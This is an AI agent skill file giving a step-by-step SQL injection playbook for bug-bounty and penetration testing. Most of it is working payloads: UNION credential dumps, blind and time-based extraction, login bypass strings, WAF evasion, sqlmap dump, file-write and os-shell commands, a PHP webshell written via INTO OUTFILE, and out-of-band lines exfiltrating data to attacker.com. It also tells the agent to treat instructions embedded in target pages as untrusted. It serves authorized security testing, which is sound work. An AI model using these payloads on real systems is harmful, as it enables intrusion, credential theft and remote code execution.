---
name: sql-injection
description: "Tests web application parameters for SQL injection vulnerabilities and exploits them to enumerate database metadata and extract data. Covers bug-bounty-style hunting (high-value endpoints, attack-surface signals, technique selection by response reflection, proof gates), entry-point detection, UNION-based, error-based, boolean-blind, time-blind, and out-of-band techniques, authentication bypass, file read/write, WAF bypass, per-DBMS payloads (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, DB2, Cassandra), NoSQL operator injection and ORM raw-fragment SQLi (Django/Mongoose/Sequelize CVE patterns), second-order and non-SELECT injection contexts, automated exploitation with sqlmap, real-world case studies, and defensive triage of SQLi attempts in WAF logs."
when_to_use: "user asks to test a parameter for SQL injection, hunt SQLi on a bug bounty target, find high-value injectable endpoints, exploit a UNION-based SQLi, needs a sqlmap command, asks about blind/error-based/time-based/OOB SQLi, authentication bypass via SQLi, SQLi WAF/tamper bypass, second-order or INSERT/UPDATE/ORDER BY injection, GraphQL/JSON/header SQLi, NoSQL/MongoDB operator injection or ORM (Django/Mongoose/Sequelize) raw-fragment SQLi, database enumeration or data extraction through an injection point, validating whether a finding is reportable, or detecting SQLi campaigns in WAF/ModSecurity logs"
allowed-tools: Read, Grep, Bash
metadata:
  author: workspace
  version: "3.0"
  sources: see references/sources.md
---

# SQL Injection Testing Skill

Task skill: follow this procedure to detect, confirm, and exploit SQL injection in an **authorized** target (own application, signed scope document, bug bounty program, or CTF instance). Only inject against systems you are permitted to test. Keep payloads minimally invasive — prefer read-only enumeration; do not write files, drop tables, create users, or pivot unless explicitly in scope.

## 0. Progressive Disclosure — Load References On Demand

`SKILL.md` carries the full manual-testing lifecycle. Load these companion files only when the situation calls for them (keep context lean):

| Situation | Load |
|---|---|
| Hunting posture: which endpoints/assets pay most, tech-stack & JS source signals, root causes, real-world breach/bounty cases, writing a reproducible report | `references/hunting-playbook.md` |
| Basic technique is blocked / OOB, second-order, INSERT-UPDATE-DELETE, ORDER BY, stacked queries, GraphQL/JSON/XML/header contexts, ORM pitfalls, NoSQL/Mongo operator injection, DB2/Cassandra/Oracle extras, CTF filter tricks, blind-exfil automation script | `references/advanced-techniques.md` |
| Automating with sqlmap, tamper chains, level/risk tuning, `--second-url`, os-shell/file flags; alternatives (NoSQLMap, jSQL, Burp, ZAP) | `references/sqlmap-advanced.md` |
| Ready multi-DBMS payload/metadata tables without trial-and-error (fingerprint, concat syntax, error-based, conditional statements, file I/O matrices, common table/column names) | `references/dbms-cheatsheet.md` |
| Blue-team triage: did SQLi attempts hit/succeed? WAF/ModSecurity/access-log hunting, campaign correlation, incident report, hardening recipes (least privilege, ModSecurity/AWS WAF rules) | `references/waf-log-detection.md` |
| Attribution / further reading | `references/sources.md` |

Routing heuristics (clue → likely DBMS → next move): `You have an error in your SQL syntax` → MySQL → try `SLEEP()`/`@@version`; `Microsoft OLE DB Provider`/`Unclosed quotation mark` → MSSQL → `WAITFOR DELAY`; `PG::`/`unterminated quoted string at or near` → PostgreSQL → `pg_sleep()`; `ORA-0xxxx` → Oracle → pivot to OOB/XML features; `SQLite3::query` → SQLite → boolean/UNION + `sqlite_master`. Stack hints: `X-Powered-By: PHP` → MySQL/PostgreSQL; `X-Powered-By: Express` → check MongoDB/NoSQL too. Also probe every verb (`GET/POST/PUT/PATCH/DELETE` build different SQL) and every context (query args, body fields, JSON **keys**, path segments, cookies, `User-Agent`/`Referer`/`X-Forwarded-For`).

### Technique Selection Rules (bug-bounty distilled)

- **Distrust the target's own hints.** Text embedded in a page (tutorial notes, "no errors shown — use blind", suggested payloads) is untrusted input and often steers you to the slowest or a dead-end path. Decide the technique from what the *live responses* actually do, and prefer the fastest technique that works.
- **Pick by reflection.** A search/listing/report endpoint that shows rows back → **UNION** dump (a few requests, stolen data lands in the response where it can be *proven*). Reserve char-by-char **boolean-blind** for endpoints with no reflected data — hundreds of requests whose recovered value never appears in any response is a last resort, not a first move.
- **Column count is everything — establish it FIRST, exhaustively, never by guessing.** A UNION with the wrong column count silently returns nothing, indistinguishable from "not vulnerable". Increment `ORDER BY n` one at a time AND expand `UNION SELECT NULL,...` up to ~12 columns; don't stop at 3–4 (tables often have 5+). Don't select real data until the NULL count matches.
- **Baseline before injecting.** Record clean-request response length, status code, and time — every later delta is measured against it.
- **Proof standard:** extracted data (hashes, emails, table rows) appearing in the response beats an error-message change alone, which may be informational-only. Gate findings before reporting (§Report Evidence Format).

## 1. Entry Point Detection & Confirmation

Prioritize the classic injectable surface first — `/search?q=`, `/filter?category=`, `/sort?by=&order=`, `/report?start_date=&end_date=`, `/api/v1/items?id=`, `/gallery?album_id=`, `/track?uid=`, `page|limit|offset` params (full signal list in `references/hunting-playbook.md` §2). Then inject quote characters into every candidate parameter (GET, POST, JSON body, cookies, headers like `User-Agent`/`X-Forwarded-For`, URL path segments, uploaded filenames) and watch for DBMS errors, changed output, HTTP status changes, or timing shifts:

```sql
'          -- single quote
''         -- doubled quote: escapes out of a string context -> syntax error if concatenated
"          -- double quote
`          -- backtick (MySQL identifier quoting)
')         -- close quote+paren (wrapped params)
"))        -- double-quote + paren nesting
;          -- statement separator probe (stacked queries)
\)         -- escaped paren + quote (for wrapped params)
```

Error signatures reveal the backend: `You have an error in your SQL syntax` (MySQL), `unterminated quoted string` / `pg_query()` (PostgreSQL), `Unclosed quotation mark` (MSSQL), `ORA-01756` (Oracle), `SQLite3::query` (SQLite). Behavioral deltas matter more than errors — compare `'` vs `''`, response **length** changes, 200-vs-500 flips, and timing shifts. See §0 for the clue→DBMS routing table.

Logical confirmation — compare true vs. false responses:

```sql
' OR '1'='1        -- always-true: expect full/different result set
' AND '1'='2       -- always-false: expect empty/changed result
1 AND 1=1          -- numeric context, true
1 AND 1=2          -- numeric context, false
') OR ('1'='1      -- wrapped/parenthesized context
' or 1=1 limit 1 -- -   -- pin to one row when multi-row breaks rendering
```

Mathematical confirmation (numeric parameters): if `?id=2-1` returns the same page as `?id=1`, the expression is evaluated by the DB → injectable.

Comment terminators by DBMS (use to close the injected clause):

| DBMS | Comment syntaxes |
|---|---|
| MySQL | `-- ` (dash-dash-space), `#`, `/* */` |
| PostgreSQL | `--`, `/* */` |
| MSSQL | `--`, `/* */` |
| Oracle | `--` |
| SQLite | `--` |

URL-encode comments as needed: `-- -` → `--+-` or `%2d%2d%20`; `#` → `%23`.

## 2. UNION-Based SQL Injection

Use when query results are reflected in the response.

**Step 1 — column count.** Increment until the response breaks:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -   -- error at N means N-1 columns
```

Alternative: `' UNION SELECT NULL-- -`, then add `,NULL` until no error.

**Step 2 — string-compatible columns.** Replace one `NULL` at a time with a marker:

```sql
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -
```

The iteration that renders without error marks a text column; use it for extraction.

**Step 3 — extract data (MySQL examples):**

```sql
-- Database fingerprint
' UNION SELECT database(),user(),version()-- -

-- Table names
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -

-- Column names
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- Credentials
' UNION SELECT username,password,NULL FROM users-- -
```

Multiple rows: append `LIMIT 0,1`, `LIMIT 1,1`, … or aggregate with `GROUP_CONCAT(table_name)` / `group_concat(column_name separator ',')`. Combine columns per dialect: MySQL `CONCAT(user,0x3a,password)`, MSSQL `user+':'+pass`, Oracle/PostgreSQL/SQLite `user||':'||pass` (full matrix in `references/dbms-cheatsheet.md`). If the original query renders only its own row, make it return nothing (`?id=-1'` or `AND 1=2`) so your UNION row displays. For other DBMS metadata sources, see §10.

## 3. Error-Based SQL Injection (MySQL)

Use when errors are displayed but query output is not. Data rides inside the error message:

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))-- -
```

`0x7e` (`~`) forces an XPath parse error so the value is echoed. Output is truncated (~32 chars); iterate with `SUBSTRING(...,32,32)`. Also try `floor(rand()*2)` group-by duplication and `EXP(~(SELECT ...))` variants. Other DBMS error channels: MSSQL `' AND 1=CONVERT(int,(SELECT @@version))-- -`, PostgreSQL `' AND 1=CAST((SELECT version()) AS int)-- -`, Oracle `' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -` (matrix in `references/dbms-cheatsheet.md`).

## 4. Boolean-Based Blind SQL Injection

No visible data or errors, but true/false render differently. Infer one character at a time:

```sql
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))=109-- -   -- m
' AND (SELECT username FROM users LIMIT 1) LIKE 'a%'-- -
```

```sql
' AND 1=1-- -                 (true condition)
' AND 1=2-- -                 (false condition)
' AND SUBSTRING(version(),1,1)='5'--
1 AND (SELECT COUNT(*) FROM users) > 0--    -- existence checks before char extraction
1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--   -- does a row exist?
' AND SLEEP(0)-- -            -- control/timing baseline request
```

Method: pick a baseline condition known to be TRUE and one known FALSE. Then bisect each character's ASCII value (binary search 32–126) using `>=` comparisons; the response matching the TRUE baseline reveals the character. Automate loops with a script rather than manual requests (ready Python time-blind extractor: `references/advanced-techniques.md` §15).

## 5. Out-of-Band (OOB) Extraction

When nothing renders back — no output, no errors, unreliable timing — exfiltrate via DNS/HTTP/SMB to a domain you control:

```sql
-- Oracle DNS
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.attacker.com')-- -
-- MSSQL SMB/DNS
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -
-- MySQL (Windows) UNC -> DNS + NTLM leak
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\a'))-- -
```

Full OOB cookbook (chunking, ports, OPENROWSET) in `references/advanced-techniques.md` §1.

## 6. Time-Based Blind SQL Injection

When responses are identical regardless of truth value, use delays:

```sql
-- MySQL
' AND SLEEP(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -

-- SQLite (no sleep; heavy computation instead)
' AND randomblob(500000000/1)-- -
```

Conditional extraction (MySQL):

```sql
' AND IF(SUBSTRING(database(),1,1)='m',SLEEP(5),0)-- -
```

Compare elapsed time against a control request (`' AND SLEEP(0)-- -`); a ≥5s delay = true. Run several samples to filter network noise. Fast CLI timing check (baseline then inject, diff `time_total`):

```bash
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test"
curl -o /dev/null -s -w "%{time_total}\n" "https://target.com/search?q=test'+AND+SLEEP(5)--"
```

Alternate delay primitives when `SLEEP`/`pg_sleep` is filtered: MySQL `BENCHMARK(10000000,MD5(1))`, `GET_LOCK('a',5)`; MSSQL conditional `IF((SELECT COUNT(*) FROM users)>0) WAITFOR DELAY '00:00:05'`; PostgreSQL `AND (SELECT 1 FROM pg_sleep(5))`; SQLite `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))`. Full conditional-statement matrix per DBMS: `references/dbms-cheatsheet.md`.

## 7. Authentication Bypass Payloads

Login forms, password-reset identifiers, and session tokens:

```sql
admin'-- -
admin'#
' OR '1'='1
' OR 1=1-- -
') OR ('1'='1
admin' /*
' or 1=1 limit 1 -- -+
admin' OR '1'='1'--         -- closes the trailing quote of username='...'
' OR ''='                   -- quote-free variant for some filters
```

NoSQL/Mongo login bypass (adjacent class, same auth-bypass mindset — full coverage in `references/advanced-techniques.md` §16): JSON body `{"username": {"$gt": ""}, "password": {"$gt": ""}}`, query-string `username[$ne]=x&password[$ne]=x`, `$regex` token brute-forcing (Rocket.Chat CVE-2021-22911 pattern).

Why it works — visualize the sink before choosing the payload:

```sql
-- Original query
SELECT * FROM users WHERE username='[input]' AND password='[md5(input)]'
-- Username = admin'-- -   becomes
SELECT * FROM users WHERE username='admin'-- -' AND password='...'   -- password check commented out
```

Advanced (HackTricks):

- **MD5 raw-hash bypass** — apps doing `md5($pass, true)` comparison: password `ffifdyop` yields raw bytes starting `'or'6...` which turns the password check into an always-true string comparison.
- **GBK wide-byte injection** — escaping via `addslashes` broken by multibyte charset: `%A8%27 OR 1=1;-- 2` (the `\` added by escaping combines with `%A8` to form a valid GBK character, freeing the quote).
- **Polyglot injection** — payload valid across contexts: `SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/`

## 8. File Operations (MySQL)

Requires knowing web root/paths and appropriate privileges (`FILE`, plus `secure_file_priv` permitting the path). Verify first:

```sql
' UNION SELECT @@secure_file_priv,NULL,NULL-- -
```

Read files (needs `FILE` privilege and world-readable file):

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -
```

Write a webshell (needs write perms to target dir; `INTO OUTFILE` cannot overwrite existing files):

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
```

Prefer `LOAD_FILE` reads over writes; only write files if exploitation is explicitly authorized. Log-table abuse (`general_log_file`) and MSSQL `xp_cmdshell` / PostgreSQL `COPY ... FROM PROGRAM` are analogous RCE paths on those DBMS.

## 9. WAF Bypass Techniques

Try in order; combine freely:

- **No spaces:** `%09` `%0A` `%0C` `%0B` `%A0`, inline comments: `'/**/UNION/**/SELECT/**/1,2,3-- -`, parenthesis tricks like `!(1,2)`, `SELECT(username)FROM(users)`.
- **No commas:** `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` ; `LIMIT 1 OFFSET 1` instead of `LIMIT 0,1`; `SUBSTRING(database() FROM 1 FOR 1)`.
- **Keyword blacklist:** case variation `uNiOn SeLeCt`, mixed encoding `%75nion`, double URL-encoding, keyword nesting `UNIunionON SELselectECT`, comment-splitting `SEL/**/ECT`, versioned comments `/*!50000SELECT*/`.
- **Equivalent operators:** `AND` → `&&`, `OR` → `||`, `=` → `LIKE` / `RLIKE` / `REGEXP` / `IN` / `BETWEEN`, `>` → `NOT BETWEEN 0 AND` / `GREATEST(x,N)=x`, negation with `<>`, `SUBSTR` → `MID`/`LEFT`, remove spaces around operators: `id=1AND sleep(5)`.
- **Quote/string filters:** hex literals `0x61646D696E`, `CHAR()/CHR()` construction, PostgreSQL dollar-quoting `$$admin$$`, wide-byte GBK (`%bf%27`).
- **Scientific notation bypass:** `1.e(1)` style constructs to call/space around functions without literal spaces.
- **Other:** HTTP parameter pollution (`?id=1&id=' UNION...`), chunked transfer encoding, non-standard content types, JSON-operator conditions the WAF can't parse (`' AND '{"b":2}'::jsonb @> '{"b":2}'::jsonb-- -`), fragmented payloads across separators.
- **Encoding ladder:** URL encode (`%27` `'`, `%20` space, `%23` `#`) → double URL encode (`%2527`) → Unicode look-alikes (U+02BC modifier apostrophe as quote) → HTML entities in reflected contexts (`&#39;`) → hex literals (`0x27204f52...`).
- **Comment variants (MySQL):** `'/**/OR/**/1=1-- -`, `'/*!OR*/1=1-- -`, `'--+OR+1=1-- -` (URL-plus spaces), `'/*OR 1=1*/-- -`.
- **Header-based injection** to bypass URL/body-inspecting WAFs: `curl -H "X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--" https://target.com/` (same for `User-Agent`, `Referer`).
- **JSON/NoSQL WAF bypass:** unicode-escaped keys/values the parser normalizes but signatures miss — `{"username": {"$\u0067t": ""}}`, `{"user\u006eame": {"$gt": ""}}`.
- **"Authenticated-only" endpoints:** WAFs often whitelist authenticated traffic — obtain a low-privilege/trial account and inject there (Airflow pattern).

Fingerprint the filter first: which single token trips it (quote? keyword? space?) determines the minimal mutation — shotgun encodings waste requests and raise IDS noise. Full tamper-script mapping for sqlmap: `references/sqlmap-advanced.md` §4–§5; CTF-grade tricks (HANDLER, PREPARE+hex, XOR blind, innodb_table_stats): `references/advanced-techniques.md` §12.

## 10. DBMS Quick Reference Table

| DBMS | Version Query | Current Database | Current User | Tables Metadata Source |
|---|---|---|---|---|
| MySQL | `@@version` | `database()` | `user()` | `information_schema.tables` |
| MSSQL | `@@version` | `db_name()` | `system_user` | `information_schema.tables` |
| PostgreSQL | `version()` | `current_database()` | `current_user` | `information_schema.tables` |
| Oracle | `v$version` | `SELECT ora_database_name FROM dual` | `SELECT user FROM dual` | `all_tables` |
| SQLite | `sqlite_version()` | n/a | n/a | `sqlite_master` |

Per-DBMS extraction notes:

```sql
-- PostgreSQL: cast everything to text
' UNION SELECT NULL,NULL,table_name::text FROM information_schema.tables WHERE table_schema='public'-- -

-- MSSQL: TOP instead of LIMIT, default schema dbo
' UNION SELECT TOP 1 name,NULL,NULL FROM sysobjects WHERE xtype='U'-- -

-- Oracle: type alignment + dual
' UNION SELECT banner,NULL,NULL FROM v$version-- -

-- SQLite: no information_schema
' UNION SELECT name,type,sql FROM sqlite_master-- -
```

## 11. sqlmap Integration

Automate detection/exploitation after manual confirmation (or use it to triage many parameters fast):

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# Restrict/force techniques: B=Boolean, E=Error, U=Union, S=Stacked, T=Time
sqlmap -u "http://target.com/page?id=1" --technique=BEUST --batch

# Enumerate databases / tables / columns
sqlmap -u "http://target.com/page?id=1" --dbs --batch
sqlmap -u "http://target.com/page?id=1" -D dbname --tables --batch
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns --batch

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump --batch

# Authenticated/raw requests and POST bodies (-r takes a saved raw HTTP request, e.g. Burp copy-as-raw)
sqlmap -r request.txt --batch --level=3 --risk=2
sqlmap -u "http://target.com/login" --data="user=admin&pass=x" --cookie="PHPSESSID=..." --batch

# Tamper scripts for WAFs
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,randomcase,between --batch
```

Add `--dbms=mysql` once the backend is fingerprinted to skip probing; `--os-shell` only if fully authorized. Operational flags worth knowing up front:

```bash
# Route through Burp for visibility/replay of every sqlmap request
sqlmap -u "http://target.com/page?id=1" --batch --proxy="http://127.0.0.1:8080" --user-agent="Mozilla/5.0"

# Pin the vulnerable parameter and tune noise
sqlmap -u "http://target.com/admin/report?ref=1&tab=2" -p ref --level=3 --risk=2 --threads=2 --delay=0.5

# Direct file read/write and interactive SQL shell (authorization required)
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd" --batch
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
sqlmap -u "http://target.com/page?id=1" --sql-shell --batch
```

Non-sqlmap tooling (NoSQLMap, jSQL, Burp Intruder column-count payload sets, ZAP/nikto quick scans): `references/sqlmap-advanced.md` §10.

## 12. Methodology Checklist

1. Identify all input vectors (GET, POST, JSON body **and keys**, cookies, headers, path segments, uploaded filenames) and all HTTP verbs — each verb builds a different SQL statement. Prioritize high-signal endpoints (`/search`, `/filter`, `/sort`, `/report`, tracking/analytics params; `references/hunting-playbook.md` §1–§2).
2. Baseline the clean response: record length, status code, and time for every candidate endpoint before injecting anything.
3. Test each with a single quote (`'`) and observe errors/response deltas (length, status, timing).
4. Confirm with logical true/false pairs (`' OR '1'='1` vs `' AND '1'='2`; `1 AND 1=1` vs `1 AND 1=2`) and arithmetic (`?id=2-1`).
5. Fingerprint the DBMS from error signatures and stack hints (§0 routing table) so payload dialect matches.
6. Determine column count exhaustively (`ORDER BY` increment one-at-a-time AND `UNION SELECT NULL` expansion up to ~12) — never guess; a wrong count looks identical to "not vulnerable" (§0 rules).
7. Choose an exploitation technique based on output visibility: UNION (reflected) → error-based (errors shown) → boolean-blind (render delta) → time-blind (nothing visible) → OOB (no reliable channel; `references/advanced-techniques.md` §1).
8. Enumerate database metadata (version, current DB, tables, columns) via the §10 source for the identified DBMS.
9. Extract target data (credentials, PII relevant to scope) with LIMIT/GROUP_CONCAT paging — proof-of-concept quantities only.
10. Probe non-standard contexts if classic ones are clean: second-order sinks, INSERT/UPDATE/DELETE, ORDER BY/sort params, GraphQL args, NoSQL operator injection in JSON bodies, ORM raw fragments (`references/advanced-techniques.md` §2–§4, §8, §10, §16).
11. Test for file read/write only if the DB user is privileged and it is in scope (§8); note RCE chains (xp_cmdshell, COPY FROM PROGRAM, INTO OUTFILE) as impact.
12. Gate the finding before reporting (Report Evidence Format below), document it (endpoint, parameter, exact payload, evidence request/response, impact) and provide remediation guidance (§13).

## Report Evidence Format

For each confirmed finding include: endpoint + method, vulnerable parameter/context, injection type + technique, minimal reproducible payload, before/after response excerpt, DBMS + privilege level reached, data class touched, severity, and the specific fix location. Keep extracted samples redacted/sanitized per engagement data-handling rules.

**Gate 0 — three questions before writing any report:**

1. **What can the attacker DO right now?** Demonstrate at least one of: extract DB version/name via error or UNION, prove time-delay control (5s SLEEP confirmed by timing), extract a row from `information_schema.tables`, bypass authentication via boolean injection, or (NoSQL) bypass login / extract collection data. If the *only* evidence is an error-message change with no data or timing proof, rate it informational/Low or keep digging.
2. **What does the victim LOSE?** Name the specific data at risk (PII, credentials, session tokens, transaction records, exfiltration path). A generic "database could be read" without identifying which table holds sensitive data weakens the report significantly.
3. **Is it reproducible in 10 minutes from scratch?** Single curl command or Burp repeater request that triggers it, no dependency on expiring session state, consistent behavior (manual payload or sqlmap tamper chain), and steps a triage engineer can follow without you. If reproduction needs multiple accounts, special timing, or races — document every prerequisite explicitly.

**Impact chains worth stating in reports** (full patterns + disclosed cases in `references/hunting-playbook.md` §4–§5): SQLi on FILE/sysadmin-privileged DB user → RCE; blind SQLi extracting UUIDs → mass-IDOR enumeration; SQLi on `password_reset_tokens` → account takeover without ever seeing the password; multi-tenant SaaS injection → cross-customer breach; regional/legacy subdomains and third-party plugins often sit outside the primary WAF perimeter.

## Troubleshooting

| Symptom | Likely cause / next move |
|---|---|
| No error messages at all | Generic error handling → switch to blind boolean/time; compare response **lengths** instead of content |
| UNION fails | Wrong column count (re-run ORDER BY), type mismatch (all NULLs first), results not rendered (make original query return no rows), or param is used outside WHERE (second-order) |
| Payload never executes | Verify comment syntax for the DBMS, check parameterization, confirm input reaches SQL at all, try other contexts (headers/cookies/path) |
| Time-based inconsistent | Network jitter/caching → longer delays (10s+), multiple samples, control request, `--delay` in sqlmap |
| Blocked after first requests | Rate limiting/WAF behavioral rules → slow down, rotate encodings minimally, don't escalate evasion without authorization |

## Constraints & Guardrails

- Never execute destructive statements (`DROP`, `DELETE`, `TRUNCATE`, `UPDATE ... WHERE 1=1`) — in DELETE/UPDATE sinks, prove injection with time-based payloads only.
- Limit extraction to PoC quantities; stop and notify the engagement contact if you hit production data beyond scope.
- Avoid resource-exhaustion payloads (BENCHMARK/Cartesian DoS) — availability impact is out of scope.
- Blind automation can mean thousands of requests: coordinate rate limits so testing itself isn't a DoS.
- Legal prerequisites before any of this: written authorization, defined scope, data-handling agreement, emergency contact path.

## 13. Remediation Note

Report every confirmed injection point with its fix: **use parameterized queries / prepared statements** (PDO, JDBC PreparedStatement, ORM bound parameters) and never concatenate user input into SQL strings. Note that parameterization is bypassable in specific scenarios — unbound identifiers (table/column/ORDER BY names), partial parameterization, dynamic `IN (...)` lists, second-order reuse, and PDO emulated prepares (`references/advanced-techniques.md` §10). Supplement with least-privilege DB accounts, server-side allowlist validation for identifiers that can't be bound (table/column names), disabled verbose errors in production, and `secure_file_priv` hardening. A WAF is defense-in-depth, not a fix. For detecting exploitation attempts in telemetry, see `references/waf-log-detection.md`.

## References

- `references/hunting-playbook.md` — bug-bounty hunting posture: crown-jewel targets, URL/header/JS attack-surface signals, common root causes, real-world breach & disclosed-report cases (Uber sctrack, Airflow, Rocket.Chat CVE-2021-22911, Mongoose CVE-2024-53900, Django CVE-2024-42005, Mozilla invite), modern 2024+ vectors (GraphQL/AI/cloud/JWT injection)
- `references/advanced-techniques.md` — OOB/DNS/SMB exfil, second-order, INSERT/UPDATE/DELETE, ORDER BY/LIMIT, stacked queries, privilege checks, pivoting, GraphQL, JSON/XML/header contexts, ORM pitfalls, NoSQL/Mongo operator injection, SQLite/Oracle/DB2/Cassandra extras, CTF filter tricks, time-blind automation script
- `references/sqlmap-advanced.md` — tamper script matrix, WAF tamper-chain recipes, level/risk tuning, enumeration pipeline, second-url, os-shell/file flags, alternative tooling (NoSQLMap, jSQL, Burp, ZAP)
- `references/dbms-cheatsheet.md` — multi-DBMS payload & metadata tables (fingerprinting, concat syntax, error-based, conditional statements, file I/O, OS exec, filter-evasion quick table, common table/column names, error signatures)
- `references/waf-log-detection.md` — defensive triage of SQLi campaigns in WAF/ModSecurity/access logs, success determination, incident report skeleton, hardening recipes (least-privilege grants, ModSecurity/AWS WAF rules), MITRE/NIST mapping
- `references/sources.md` — full source attribution (community skills merged into this skill + canonical references)
